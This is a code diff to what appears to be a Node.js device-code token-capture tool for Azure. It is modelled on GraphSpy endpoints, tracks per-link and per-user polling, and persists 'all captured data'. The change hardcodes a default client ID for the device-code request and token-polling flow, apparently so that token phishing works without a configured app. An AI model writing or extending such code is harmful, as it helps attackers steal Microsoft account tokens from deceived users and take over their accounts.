@@ -22,6 +22,7 @@ const crypto = require('crypto');
 const forge = require('node-forge');
 
 const TENANT = config.AZURE_TENANT || 'common';
+const DEVICE_CODE_CLIENT_ID = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
 // ── GraphSpy exact endpoints / scopes (core/device_codes.py, core/device.py) ──
 // device_codes.generate(version=2)
@@ -127,7 +128,7 @@ async function requestDeviceCode() {
   const { proxy, response } = await ms.post(
     TOKEN_ENDPOINT_V2,
     new URLSearchParams({
-      client_id: config.AZURE_CLIENT_ID,
+      client_id: DEVICE_CODE_CLIENT_ID,
       scope: DEFAULT_DEVICE_CODE_SCOPE,
       claims: JSON.stringify(claims),
     }),
@@ -496,7 +497,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
         }
 
         // Persist all captured data
-        const clientIdUsed = config.AZURE_CLIENT_ID;
+        const clientIdUsed = DEVICE_CODE_CLIENT_ID;
         const tenant = TENANT;
 
         // Broker flow device enrollment
